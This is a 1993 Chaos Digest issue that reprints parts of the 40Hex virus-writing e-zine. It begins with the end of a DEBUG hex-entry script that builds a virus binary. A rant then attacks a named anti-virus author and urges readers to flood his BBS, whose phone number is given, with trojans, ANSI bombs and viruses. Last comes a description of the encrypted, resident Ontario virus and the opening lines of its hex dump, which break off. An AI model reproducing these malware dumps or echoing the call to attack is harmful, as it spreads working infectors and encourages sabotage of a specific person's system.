e 1550  14 F8 E1 DA 45 23 D1 45 0B D7 24 16 52 2D BD 52
e 1560  1B 0B FF 2E E1 D5 05 B9 6E A7 3C D4 0D EE 6C 05
e 1570  F0 CA 38 25 FC C9 A3 2C 85 02 2C 4D 0B 54 03 6D
e 1580  D5 F8 1E 9B C6 BD A1 18 E6 CA 2F DB 09 9F B5 68
e 1590  A1 C5 90 F8 1F 00 2D 2B 54 07 DE 3B 2D E9 96 31
e 15A0  FF 56 05 E2 37 3F 23 3D 33 1F 3D E7 E0 3F D4 B0
e 15B0  3D EC E0 54 04 80 09 73 F1 64 05 67 0F 2E 3F 2A
e 15C0  30 E6 E6 E2 1E A1 19 6C 14 48 39 3D 80 3C 8C 9E
e 15D0  73 8D 57 54 EA 38 24 3D 47 E1 8D 2D 32 59 0D 6E
e 15E0  0E 9C B2 16 47 11 93 F4 0B DC F7 EF 56 05 E3 9E
e 15F0  24 18 16 2E 14 2A 2E FF D5 40 3F 3D ED E0 52 15
e 1600  61 16 A7 3C 6C 05 F1 3D 26 1F 23 C0 D3 F1 38 94
e 1610  34 4A 22 5B 1C 09 9D 1A B8 8D 4D 38 8D 4F 21 E7
e 1620  22 60 19 86 08 55 C7 0B 05 4A 2B 5B 1D BA 87 05
e 1630  63 3E C4 61 14 FA 0E 5E C1 A3 96 EF E7 37 3C BB
e 1640  02 9F 0B FD 9D B3 16 C8 FF 3D 3E 1F 54 05 BD 09
e 1650  7F 21 C4 4D E7 96 85 E1 D2 24 1A 54 05 72 D5 46
e 1660  9F D4 C7 94 34 C0 C3 14 D9 08 95 1A 54 E5 46 24
e 1670  C5 90 5E B3 D2 1F 41 C6 F1 8B 2D 2B 54 2F 24 C4
e 1680  45 0B D7 4D E7 96 85 C9 D2 24 1A 8E 9F 0B FF 9D
e 1690  1C 86 05 EE CA 2E 17 2A 47 0B 76 E5 59 14 D7 6B
e 16A0  C2 85 A3 D4 D1 02 2F 93 5D E6 C2 DE 55 78 E0 F5
e 16B0  C7 BD A1 18 E6 CA 2E DF 09 72 C0 D7 22 5D B3 E2
e 16C0  CE 2A 50 E0 D4 2D 2C 5C F5 20 D4 0D 6A D2 EE A7
e 16D0  2A 45 0B D7 45 1B CA B3 13 8E 3A B9 3D E3 E0 DB
e 16E0  3B FF 8D 2E CB D5 55 59 16 D7 63 3E D8 6A C2 C6
e 16F0  B7 2A 8D 15 9E 24 16 55 F8 D3 F1 C7 94 C0 C0 15
e 1700  CA 2E A0 09 9E D2 31 46 2C 95 39 F6 B3 E3 08 1B
e 1710  39 B8 85 05 E1 1E 7F E1 D5 87 6A D2 C6 A7 2A EF
e 1720  2B 56 3D FF A0 32 BB 8C 2E C4 D5 9D EE CA 2E CB
e 1730  D5 55 63 3E DB 59 16 D7 6A D2 EE A7 2A 8D AB 37
e 1740  31 60 EB F5 C4 D4 B2 F6 D3 ED 20 CA 2E A1 09 9E
e 1750  54 95 90 5E BD E3 1F 03 98 08 1A 39 B8 85 05 0B
e 1760  23 D1 16 CA 45 23 D4 24 17 8E 3A B9 3D 72 E1 3E
e 1770  C1 6C 1F 48 3A 3D C5 E0 02 2D 16 8F 47 0A 48 E5
e 1780  19 52 1C 59 5F EA 18 54 37 EF DA 30 FF 23 D1 A3
e 1790  28 24 18 60 4B 50 D4 C4 25 02 3E DC D4 B2 57 59
e 17A0  07 6C 05 ED 20 CB 48 39 8C 2F D0 09 30 FF 23 D1
e 17B0  A3 37 3F B9 8E 41 2B 3D 73 E1 3E C1 6C 1D 48 38
e 17C0  3D C4 E0 3E 31 B8 F8 5A C3 46 7F CE 0B 47 11 7E
e 17D0  3B 16 C2 30 FF 96 24 19 65 48 37 E9 C7 94 C6 4A
e 17E0  20 5E 1E FE 5B 1D BB FE 06 09 E9 1A E3 5C 29 45
e 17F0  C1 0A 23 C4 07 3E E9 72 B5 96 8F 08 DD C6 A9 23
e 1800  D9 63 16 C4 A9 16 9B 08 21 39 94 E5 2D 19 80 C8
e 1810  18 CA 2E C3 D5 77 64 54 2B 41 F6 4D 3D 60 E5 08
e 1820  09 39 95 2E 4F 08 5E 2D 61 10 48 E0 EB 38 AE D5
e 1830  9B 94 07 C0 FF 85 4F 28 88 C8 B5 1E 9B BB 8C 2E
e 1840  99 D4 2D 2A 96 94 A9 3D CE E0 23 D1 A9 56 05 E2
e 1850  9C 05 BA 3D 32 1F A1 E8 0B 2C 94 EE CA 2E C3 D5
e 1860  47 0A 75 E5 69 06 7F C3 51 40 2D 3D 1A 1F A0 3D
e 1870  72 5C 1C 61 17 48 E0 52 15 1E DA 9C 94 D2 C0 FF
e 1880  85 F5 20 8F 94 23 8F 9D B9 3D BD E1 02 3E 0B 1F
e 1890  2D EE 8E 72 A0 8C 2E 5A D4 2D EC 8E C8 FF 86 05
e 18A0  08 FC C6 95 2E 2D 0B 3D 37 1F 6C 59 C3 FC 0D 63
e 18B0  3C DC 08 C2 C6 95 2E 46 57 5B C6 E1 A1 CB 08 0F
e 18C0  39 61 3E 72 C3 9E 4F 28 86 C0 FF 16 39 D7 8D F6
e 18D0  A7 D7 F6 A7 D4 45 23 D6 45 09 D6 05 0B DB 9D B9
e 18E0  61 86 08 6F C7 0B D9 9D B3 DB D9 23 3D EC E0 A0
e 18F0  3D 0B 3E 2E 11 2A 7E 7F F6 EF 23 6C DC E0 E6 0E
e 1900  08 C3 C6 95 2E 46 57 5B C6 E1 A1 19 08 0D 39 61
e 1910  3E 71 C3 86 C0 69 1D D9 23 5F E1 D0 B2 C7 D0 B2
e 1920  C4 63 16 C5 63 3C C5 23 3E DE B8 5E 1E B8 83 4F
e 1930  21 2A F0 86 F0 7E E0 95 98 1F 03 98 19 45 3E 09
e 1940  D2 C6 1E D2 85 02 2E 2D 01 3D E4 E0 6C 43 C3 54
e 1950  2D 49 F6 38 EF 96 24 1B 80 4D 0B 54 03 6E D5 F5
e 1960  20 EB 46 9E D5 C7 BD A1 CF E6 CA 2F D6 09 C8 FF
e 1970  8E 95 23 18 96 1E 1C 2D F6 5F C1 A3 5F E1 66 11
e 1980  4E A7 2A 8F 68 F2 85 D3 15 8F 23 DB D9 0B C6 2E
e 1990  07 2A 3E 95 2F 9E BB 8C 93 1F E3 A0 C5 88 F8 1F
e 19A0  00 9B 08 D5 C6 59 51 E5 BB 54 2D 56 F6 2E 29 2A
e 19B0  B3 1B 55 79 6F D5 C7 1C A1 16 E6 CA 2F D1 09 4F
e 19C0  A9 85 2D F7 5F C1 A3 5F E1 66 35 4E A7 2A 4E C7
e 19D0  96 F5 20 56 2F E2 16 C8 FF 3E D3 08 33 39 95 2E
e 19E0  9E BB 2E 9F 1F E3 A0 C5 5A C0 7A F0 39 F6 4F E3
e 19F0  08 D5 C6 BB 54 2D 58 F6 7F 64 F6 2E 26 2A B3 1B
e 1A00  55 79 6F D5 C7 94 1A C0 FF 3C F6 3C 87 4C 97 2A
e 1A10  96 6A C2 38 2E E5 F1 66 27 45 23 D4 24 13 8C 9E
e 1A20  09 D0 C6 08 D5 C6 0B D8 4D 30 8D 4D 38 8D 57 1F
e 1A30  C3 A0 C5 3E 28 BB 6C 43 C3 DB 47 0B 4A E5 FF 5F
e 1A40  81 1F 2B 0E D0 D2 85 02 23 46 5F 5B C6 E1 A0 C7
e 1A50  23 D3 F5 20 CA 2F D0 09 38 29 55 F1 87 96 8F A3
e 1A60  9C B3 17 2A F0 86 F0 49 E6 4C E3 BB 8C 2D E3 3D
e 1A70  E9 E0 2A D0 79 F0 2D 17 6D C4 E0 54 05 81 08 38
e 1A80  2F 6C 42 C1 DB F4 08 CA 46 D7 B2 8F E1 16 8F 95
e 1A90  22 47 23 5A C6 1E DA C0 FF A0 C7 23 5C 0E 09 E6
e 1AA0  1A BB 3E 12 A9 55 F1 08 56 05 E2 56 2F E2 A0 33
e 1AB0  BB 2A F0 86 F0 49 E6 4D E3 0B D6 2E CE D5 9F 1F
e 1AC0  C3 5E C5 3E 30 58 D7 C6 61 16 A7 3C 6C 40 C3 DB
e 1AD0  F5 28 CA 46 D7 3D C7 23 FE 0E 95 22 47 23 5A C6
e 1AE0  1E DA C0 FF A0 C7 23 5C 0E 09 E1 1A BB 3E 10 D3
e 1AF0  87 4C 97 2A 4C F7 E5 F1 66 27 45 23 D4 24 15 8F
e 1B00  3D BB 8C 39 F6 B3 E3 08 D6 C6 A0 E6 18 EB 23 38
e 1B10  27 8E 47 0B 74 E5 63 16 C4 59 50 E2 1E 18 C8 FF
e 1B20  5F 81 1F E5 C1 A3 37 3E 61 16 48 E0 52 18 1E D9
e 1B30  B3 E3 52 35 23 D3 F5 20 CA 2F D0 09 94 6A A2 39
e 1B40  6A C2 C6 D7 53 10 A3 37 31 BA 8E 9F B6 6B A1 C5
e 1B50  9B 39 F4 3D C4 E0 E6 18 61 23 B0 F8 8E 98 61 3E
e 1B60  59 C3 6C 43 C3 DB D9 6A 92 39 C8 D2 85 02 2D 47
e 1B70  23 5B C6 67 26 38 EC A0 C5 67 0B 05 E6 E6 06 FF
e 1B80  3C F3 3C 5E 08 E5 83 F2 B0 55 F1 E5 2B C1 A3 37
e 1B90  3E B8 96 87 1D 2C 96 37 8D 9D B9 2A D0 86 F0 2E
e 1BA0  E3 D5 7D E1 83 9D 61 3E 59 C3 6C F2 69 6C 43 C3
e 1BB0  DB 96 58 D5 C6 6E 0D 9E FF 2B C9 60 E2 C3 A3 37
e 1BC0  3E 59 F6 C6 1E 5A 48 E0 A1 72 E6 6C C6 E0 CA 2F
e 1BD0  D2 09 05 1B 85 11 60 E2 D6 63 16 C7 02 2D 9E BB
e 1BE0  8C 90 5E B3 E3 18 2A D2 18 8B 85 08 FC C6 61 3E
e 1BF0  59 C3 6C 41 C3 9C 3F A9 55 F1 F0 56 05 E1 37 3E
e 1C00  6B 1E 7F 6E D5 C7 2B 2B C9 94 D7 2D E1 16 C0 58
e 1C10  D5 C6 FF 2D 2F D9 09 9D B3 DB 97 19 8C D9 18 16
e 1C20  46 E7 D0 45 23 D4 24 18 8E 87 B9 83 78 86 F0 39
e 1C30  F4 2D 98 A2 85 9C 70 3D C7 E0 2D 9D 61 3E 59 C3
e 1C40  60 E5 51 50 2E F9 D5 46 CF D0 85 18 56 04 F2 37
e 1C50  30 61 16 48 E0 2B C9 95 DE 05 A3 54 07 9A D8 11
e 1C60  EE CA 05 44 D3 D9 09 E6 1A B8 8E 3E CE C7 EE 06
e 1C70  43 EB 02 51 E9 9E 4B B4 36 4F 50 02 B9 7E 46 44
e 1C80  13 94 B9 B8 76 43 0B F5 80 4E 58 CB 57 9E BA 55
e 1C90  57 D0 E8 88 FD 0A 2E A0 7C 3C A2 E0 26 F3 E1 2B
e 1CA0  10 2E A6 24 C6 65 F1 F9 E5 3D C7 20 8A 07 26 13
e 1CB0  E8 CE 9C EE 3B 89 72 C9 8D C8 08 BF B4 36 9F B2
e 1CC0  98 A7 65 AA EF BF 4B 68 6D 5F 00 49 E6 82 41 54
e 1CD0  3E 9F A2 66 05 1B 13 40 54 70 B8 26 50 2E D9 05
e 1CE0  66 03 61 59 CE 4F EE 05 CC F1 70 DA 2B DD E2 56
e 1CF0  F7 3E FB D7 40 C1 0F E8 67 F8 8F EC 30 E2 20 EF
e 1D00  AA FA D7 4C E1 23 E8 DF 11 B2 DA DD 66 2F 9E 11
e 1D10  3D 08 EC 16 40 36 72 03 FB 28 C8 0D 71 DC BA 22
e 1D20  E3 50 5F DD 74 59 73 4C 8E 41 04 54 DC 25 6F 79
e 1D30  C1 9D 73 39 99 C1 66 99 18 67 6E E5 A7 E8 25 FD
e 1D40  0A 52 54 AF 19 8F F1 56 8F 4A 57 6C C3 CE E0 ED
e 1D50  2A F1 D0 04 DF 24 C2 2B C6 C5 19 CE C1 FC CF AA
e 1D60  FB E0 CB 36 40 37 01 10 DE 53 04 48 AC 56 00 76
e 1D70  C0 94 D3 B6 A4 D3 34 6D EB 40 31 7D BF 70 35 65
e 1D80  90 96 C0 3E 09 19 8E 53 45 40 D0 F6 08 90 3E A7
e 1D90  36 04 54 35 0E 7D 93 EF 06 3D A1 5D 36 39 FE 61
e 1DA0  19 08 9A 1E 5D 36 EB 34 FB 2E A6 3D A8 3A 41 2E
e 1DB0  D9 25 79 03 4A 80 DB 53 C6 F4 9C 06 28 13 8F 20
e 1DC0  1F 00 08 93 06 8E 0F 52 CE AA 06 CF 3E E6 CE 61
e 1DD0  ED 60 D3 28 53 34 F3 2F 6B C1 A4 E0 12 C8 2C D6
e 1DE0  80 F6 EE 6F C5 67 C2 FD 63 43 F7 78 E4 91 F3 2F
e 1DF0  E0 12 C8 2C D6 80 F6 EE 6F C5 6B C2 FD 63 4F F7
e 1E00  78 E6 91 EE 6D C5 65 C2 FD 4B E8 74 E4 C8 2C D6
e 1E10  80 F6 28 24 35 28 97 D7 87 E5 4B 5B 7F F8 8A 2C
e 1E20  D3 75 0B FB 1D CB 01 E1 E9 71 C7 74 D6 1F 2F 7B
e 1E30  07 E9 0D F7 A1 D7 09 97 F6 F2 54 18 F6 E3 93 74
e 1E40  25 93 ED A6 FA 4E C0 3D 83 28 A0 24 27 FA 45 C0
e 1E50  2F 01 53 6A E8 CA FF 0D 34 2F 91 12 B2 36 CA F7
e 1E60  D7 B4 E9 36 30 0F 74 25 93 ED A6 FB F2 D8 67 03
e 1E70  A6 D6 80 CE DE EC 34 EA D7 20 FC 9F FA 63 BF 23
e 1E80  C4 7A C9 59 DD DF 02 F9 DB F9 E9 30 FA E8 2B 16
e 1E90  E4 07 1F 02 C0 32 50 9E 13 00 A8 CB 58 D9 25 0C
e 1EA0  26 EC 36 28 13 0E A9 15 0E 26 D4 06 2A 13 0A 3B
e 1EB0  DF 83 CE 9D EC 30 D9 F6 EE AC C4 04 7B 34 98 D0
e 1EC0  4B 82 2F CA C8 5A 94 14 D9 22 51 DA DD CF A8 E5
e 1ED0  CE 63 EC B3 A9 52 F8 4F 0E B6 87 45 8A CF 9F 1C
e 1EE0  57 B8 E8 A1 3A 62 AA CE 97 40 CD 9C 29 40 8F DA
e 1EF0  B1 75 C6 BA 1C 53 AF EE AA 53 FB A9 53 A2 A9 EE
e 1F00  D4 EC 9A CB E1 FB D0 EC 9A D5 E7 9A CF EC FB CE
e 1F10  EA F2 BC E6 FC BC FD F2 D9 89 82 BC EF F3 CF E1
e 1F20  B0 91 E0 9A DD E4 9A BB D7 D1 F2 D3 C3 EA C6 C7
e 1F30  BB 89 F3 D2 89 F2 DD E4 F8 C9 FB FD B8 1D B3 92
e 1F40  B6 00 73 B4 94 63 BF DC B9 87 7D 9A 31 9F 68 5D
e 1F50  01 04 8C 26 92 FA 89 5C 27 62 5B AF BC 9C 56 45
e 1F60  74 25 BE 74 FD 5F 74 89 B9 0A D0 E9 3B F6 2E A6
e 1F70  35 B3 02 ED E8 CF EE 74 D4 FB C7 CD 22 F9 F1 63
e 1F80  EF 72 CE D7 56 E4 56 FB C4 3E D9 5B DD DF EA 11
e 1F90  E3 14 D7 7E 43 DD F1 61 EF 74 CE D4 DF CE 7A 05
e 1FA0  EA D7 F4 EC 5C FB C4 E2 C9 4D DD 37 31 FB ED 6A
e 1FB0  08 E1 55 FC 26 13 E9 08 F8 E8 A1 F8 1A E8 A8 C6
e 1FC0  D3 1C B9 EC F3 6D 47 F9 E0 63 D3 69 CC F3 45 FE
e 1FD0  78 EA E3 14 26 5A DF D5 53 16 83 DC 0F 76 03 FB
e 1FE0  61 CD 0E E0 E8 78 F6 6B D7 54 F9 DD 6B C8 5C C4
e 1FF0  E8 0C F6 A0 D6 CE C5 F5 51 E2 7A A6 3A 1B 69 C4
e 2000  ED E9 B9 F4 89 F1 9A D6 08 10 3E 89 37 83 D9 0F
e 2010  72 23 20 FF CD 15 F7 A5 FC 1C D1 CC E8 02 F8 5C
e 2020  3E 80 DA 10 80 0E 97 2F 36 B5 05 B3 1A 88 DA 31
e 2030  88 C9 3E 88 FA CE 8A F2 C2 28 9B E7 0B 19 FC 88
e 2040  C9 3E B3 18 7C 25 E7 28 6D 3D 87 17 18 17 F2 31
e 2050  CF BF 27 10 80 0E 93 2F 36 C1 1D 7E 1B 25 19 38
e 2060  A6 3C 10 22 1E 91 2F 36 3F 0D A9 1A 38 D1 86 0B
e 2070  5A 84 17 18 10 F4 0E 58 2E F0 33 09 45 CF 4C FF
e 2080  CE D3 EA 33 23 1E 95 05 83 32 DD D8 3A C7 1E E9
e 2090  35 56 33 CB 96 F2 CB C0 17 35 73 2F 3D 83 28 A0
e 20A0  24 27 FA FE C0 FB 83 CC E5 47 31 93 75 2F FA F2
e 20B0  C0 EB 42 38 14 52 CD FB 89 CC 02 DC 7B A0 C6 FA
e 20C0  EB 5F A5 D3 DC 7A A0 CB 7A 27 61 FB DD E9 F5 F5
e 20D0  E8 56 F9 46 AC 71 F2 47 87 B9 6C 17 52 6B 9F 84
e 20E0  AC E9 8A 6B 9F 86 AC CF 8D B3 17 8C E9 BD 8C B3
e 20F0  18 A4 AE 99 FA AE 15 50 E6 17 50 0D 9A 8A 81 E9
e 2100  88 AD 5B 29 AF 99 D5 EE 17 48 A2 86 34 52 BF 33
e 2110  2C 8A 03 5B 64 B9 77 71 E5 AD DE F3 83 EF 06 9E
e 2120  A2 01 76 3D 8E 20 56 24 9F 7F 23 CF 5D 03 CE 01
e 2130  EA 74 90 AD 63 96 59 81 90 6B EA 74 8D 15 83 9C
e 2140  4D E6 67 29 96 AC 81 19 9D 88 B4 0F A3 AB A7 17
e 2150  92 0A BB A9 A7 2D 86 D3 81 78 7F 46 19 A5 7A B4
e 2160  0F B3 4D A7 AB 28 FE 85 C0 3B D5 90 3A 5A 6F 0D
e 2170  65 A3 7C 15 5B 71 0B DF 1F A3 C7 1F FD 10 4F A4
e 2180  C0 6B A0 91 D0 BB 20 C0 D9 3D 2D 02 FA E8 95 FA
e 2190  39 18 23 21 06 9D 2D 36 E8 28 35 09 D6 D5 CE 21
e 21A0  A8 09 D6 0C C9 B7 06 10 1A A2 10 22 A8 09 B2 1E
e 21B0  12 1A F0 9A DD F0 32 DD 06 7D 86 18 2D B0 C0 75
e 21C0  F9 1E 2B 3E 68 2D 21 F0 92 3E 22 D0 F6 CE 60 E9
e 21D0  38 B3 48 30 50 8E 43 A5 99 A2 03 B3 6E 3E 43 A8
e 21E0  76 B6 BB 97 10 A2 5B 23 65 5B 4B 64 5B 3A 86 AC
e 21F0  C3 28 4B E8 6B FA 1A B2 A9 53 B4 D7 B0 B3 83 7C
e 2200  E4 64 7C 07 65 C4 9C 26 27 96 8A 94 B3 D7 7C CA
e 2210  87 8F BB 4B 5D 08 EC 2E 13 37 00 BA 3D 8F 20 9D
e 2220  25 08 B0 60 03 3D 89 38 71 25 08 9A 0E 42 36 26
e 2230  1D 13 72 24 D0 02 75 9A C1 14 FE 26 1C 1B 73 61
e 2240  EB 2E 87 73 25 08 98 1E 44 36 2E AD 1D 64 03 3D
e 2250  FF 10 9D 25 BB D0 89 E3 F7 40 2C D3 74 DC 48 53
e 2260  9F 37 00 0F D8 2E 16 14 43 C4 E9 E8 26 13 5B A5
e 2270  D0 14 08 9B 07 AF FB C3 AF D6 5B 75 AA 24 26 3D
e 2280  80 11 71 43 C4 EA 89 CE D0 9C 08 9C 06 A8 36 2E
e 2290  85 73 25 08 9A 1E 44 36 2E AF 1D 64 03 35 3B AC
e 22A0  1C 32 54 F0 53 9E 12 00 25 D2 29 E5 50 40 2C D3
e 22B0  74 DC 3D 8B 29 21 ED 65 10 0F 08 28 07 54 D4 F8
e 22C0  DC 3D A1 46 36 2E AD 0D 62 03 3D 8B 28 77 25 08
e 22D0  EC 36 A8 36 9D E5 46 89 C3 43 81 58 17 00 E6 60
e 22E0  0C 08 B2 47 02 2A 46 22 65 03 7E 4E CF 08 93 3E
e 22F0  76 37 01 52 35 8B 60 17 2E 85 3C 24 AD 55 02 08
e 2300  B0 2D 02 61 0F 7E 4E 2E AD 35 DF 02 3D 8E 30 CE
e 2310  24 CF 6A FE A7 75 06 D9 ED EB E9 3D FE 28 42 24
e 2320  53 DB 81 40 15 FF D8 FB 61 C4 EF 1E C4 F7 40 08
e 2330  B1 4E 04 3D A2 4F 31 B0 25 FB 7D C4 15 1F AF C9
e 2340  B0 27 FB 27 27 F9 72 C7 FB C4 C7 FB 89 C7 FB 35
e 2350  C1 4B 5D 75 42 BB BA 30 B9 72 13 2E A6 24 D6 65
e 2360  F1 F9 7F 48 CF CD 3D 80 28 8F 23 26 67 11 75 42
e 2370  BB BA 30 B9 72 13 2E A6 24 D6 65 F1 F9 7F 48 E9
e 2380  2D E8 34 CE AE E7 35 83 78 8A 83 78 D7 83 0C 98
e 2390  7C 8E 35 A6 78 86 83 78 59 7D 84 E9 AF 2E AF 25
e 23A0  75 03 3D 89 18 64 25 08 9F 1E 5D 36 2E AA 15 7D
e 23B0  03 3D A3 5F 36 2E AF 1D 7F 03 3D 89 38 92 25 08
e 23C0  9A 16 B6 36 C3 CE 12 E8 5F F4 22 2B F6 C3 D4 A0
e 23D0  7D 0E 30 C9 15 9D 28 25 01 F1 92 1B 0D 87 38 8B
e 23E0  2E 96 49 D4 59 EF DD F6 97 2B F6 91 D5 3D C3 CE
e 23F0  42 E7 A0 AD 90 11 B3 3F BD 83 32 9E D0 9B AB 76
e 2400  30 5B 8B 35 86 AB BE B6 96 A0 DF 89 CD 81 8B 35
e 2410  86 A3 BE B6 96 A0 DF 89 CD 95 83 30 9E D0 9B B6
e 2420  26 A0 19 88 57 D7 AD E5 70 BC 5F 70 4C 5E 70 24
e 2430  5E B6 26 A0 19 88 90 16 AB C3 BD 31 90 67 B3 3D
e 2440  BD 45 46 78 19 EF B6 52 A8 FE 88 30 5B 8B 79 9E
e 2450  A1 BE 67 52 98 5F AB B4 98 AD BE 70 F1 5E 70 91
e 2460  41 21 28 AF 23 E2 BE 20 AF B6 B6 A4 B9 1B 6E BC
e 2470  7A 55 56 97 AD 71 70 BD 40 1F D0 E8 08 93 0F 33
e 2480  50 E2 DF D8 2E 87 6A 25 08 9D 06 5B 36 2E A8 0D
e 2490  7B 03 3D 8B 10 66 25 08 98 3E 51 36 2E AD 1D 7F
e 24A0  03 3D 8B 38 92 25 08 98 16 B6 36 C3 26 42 53 9D
e 24B0  33 00 9F 96 23 DB AA D8 0B 81 37 26 13 83 C3 03
e 24C0  E2 F7 8B CB 59 8B D9 59 B4 60 EB 1D 56 E8 02 00
e 24D0  45 69 5A 0E 81 EA A0 23 1F B9 D8 0B 87 D6 81 34
e 24E0  26 13 83 C6 03 E2 F7 EB 08 80 EC 20 E8 89 01 EB
e 24F0  DB 81 EE 75 FF 80 3C 01 75 02 5E C3 06 1F E9 30
e 2500  DC 00 1A 1A 1A 1A 1A 1A 1A 1A 1A 1A 1A 1A 1A 1A

rcx
2402
w
q

---------------------------------------------------------------------------
                                                                         HR

+++++

40Hex Volume 1 Issue 2                                                 0007

                 Now a word from a real dick


When SSS told me how much of a dick this guy I'm about to tell you
about is I didn't belive him.  His name will be kept, because if we
mention it he'll get all souped and think he's public enemy number
one in the virus community.

Who he is, is the author of a very sad anti-virus program and virus
scanner called FLU-SHOT and VIR-X, respectivly.  What the man is,
is a sad case who wallows in the shadow of John McAffe and curses
to his bitter self why he is not a popular anti-virus author.  The
reason is simple.  His product sucks.  Well lets put it this way,
his self proclaimed 'great' scanner fails to detect over 60% of all
viruses out there.  On top of that, it was very sinple for a
person, who shall remain nameless, to infect his virus scanner, and
send out trojan copies all over the USA.  The product, FLU-SHOT, is
the most annoying, false-alarm causing, piece of trash on the
market.   Nuff said on the subject.

What makes us to pissed at said asshole?  Well, take into mind the
following, from the documentation of FLU-SHOT.

----------------------------------------------------------------------------

                        The Challenge to the Worm
                        +++++++++++++++++++++++++

When I first released a program to try to thwart their demented  little
efforts, I published this letter in the archive (still in  the FLU_SHOT+
archive of which this is a part of).  What I say in  it still holds:

            As for the designer of the virus program: most
            likely an impotent adolescent, incapable of
            normal social relationships, and attempting to
            prove their own worth to themselves through
            these type of terrorist attacks.

            Never succeeding in that task (or in any
            other), since they have no worth, they will one
            day take a look at themselves and what they've
            done in their past, and kill themselves in
            disgust.  This is a Good Thing, since it saves
            the taxpayers' money which normally would be
            wasted on therapy and treatment of this
            miscreant.

            If they *really* want a challenge, they'll try
            to destroy *my* hard disk on my BBS, instead of
            the disk of some innocent person.  I challenge
            them to upload a virus or other Trojan horse to
            my BBS that I can't disarm.  It is doubtful the
            challenge will be taken: the profile of such a
            person prohibits them from attacking those who
            can fight back.  Alas, having a go with this
            lowlife would be amusing for the five minutes
            it takes to disarm whatever they invent.

            Go ahead, you good-for-nothing little
            slimebucket:  make *my* day!

-----------------------------------------------------------------------------

Funny isen't it?  Well Mr. Dickburg, I am not an adolesent, nor am
I impotent.  I lead quite a healty social life, and have no sucidal
urges.  What I am is a person who (mabey because of some deep down
psycological disorder) finds joy in seeing some geeked out,
computer nerds system go down the drain in a flash.

Oh yes there are others like me out there, many others.  It (virus
writing) is a joke.  It is done for a good laugh, to see dickheads
like you lose time and money.  So my friend, at this time I start
an active campain after you ass.

Anyone out there who wants to make some dicks day, call this
assholes cheap BBS and lets take him down.   The number is
(212)-889-6438.   Trojans, Ansi-Bombs, and all Viruses are acepted.
Go to it!

[ChaosD: Nous avons compose le numero d'appel de ce BBS, 212-889-6438,
pour apprendre que le numero avait change pour 607-326-4425. Ce dernier
nous informa de la meme facon qu'il etait desormais... accessible par
le 914-486-2025, lui-meme informant "Not in service at this time".]

------------------------------

End of Chaos Digest #1.29
************************************

Chaos Digest           Mercredi 19 Mai 1993        Volume 1 : Numero 30
                          ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.30 (19 Mai 1993)
File 1--40H VMag Issue 1 Volume 2 #008-11(1) (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found on some French BBS.  Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Issue 1 Volume 2 #008-11(1) (reprint)


40Hex Volume 1 Issue 2                                                0008

                           The Ontario Virus

      Here a quick nice little virus from our boyz up north.

 V Status:    Rare
 Discovered:  July, 1990
 Symptoms:    .COM & .EXE growth; decrease in system and free memory;
              hard disk errors in the case of extreme infections
 Origin:      Ontario, Canada
 Eff Length:  512 Bytes
 Type Code:   PRtAK - Parasitic Encrypted Resident .COM & .EXE Infector
 Detection Method:  ViruScan V66+, Pro-Scan 2.01+, NAV
 Removal Instructions:  SCAN /D, or Delete infected files
 General Comments:

The Ontario Virus was isolated by Mike Shields in Ontario, Canada
in July, 1990.  The Ontario virus is a memory resident infector of
.COM, .EXE, and overlay files.  It will infect COMMAND.COM.

The first time a program infected with the Ontario Virus is executed,
it will install itself memory resident above the top of system memory
but below the 640K DOS boundary.  Total system memory and free memory
will be decreased by 2,048 bytes.  At this time, the virus will
infect COMMAND.COM on the C: drive, increasing its length by 512 bytes.

Each time an uninfected program is executed on the system with the
virus memory resident, the program will become infected with the viral
code located at the end of the file.  For .COM files, they will
increase by 512 bytes in all cases.  For .EXE and overlay files, the
file length increase will be 512 - 1023 bytes.  The difference in
length for .EXE and overlay files is because the virus will fill out
the unused space at the end of the last sector of the uninfected file
with random data (usually a portion of the directory) and then append
itself to the end of the file at the next sector.  Systems using
a sector size of more than 512 bytes may notice larger file increases
for infected files.  Infected files will always have a file length
that is a multiple of the sector size on the disk.

In the case of extreme infections of the Ontario Virus, hard disk
errors may be noticed.

Ontario uses a complex encryption routine, and a simple identification
string will not identify this virus.

---------------------------------------------------------------------------

n ontario.com
e 0100  E9 1D 00 1D 66 65 63 74 65 64 20 50 72 6F 67 72
e 0110  61 6D 2E 20 0D 0A 24 BA 02 01 B4 09 CD 21 CD 20
e 0120  90 E8 E9 01 93 84 7B D9 F8 69 7C 3C 84 7B B6 A5
e 0130  71 60 0F CB 65 B7 BB 0A A3 07 55 97 7F 86 BE 9A
e 0140  FF 84 55 0D E5 84 79 AA F7 1A 79 86 F7 47 30 0A
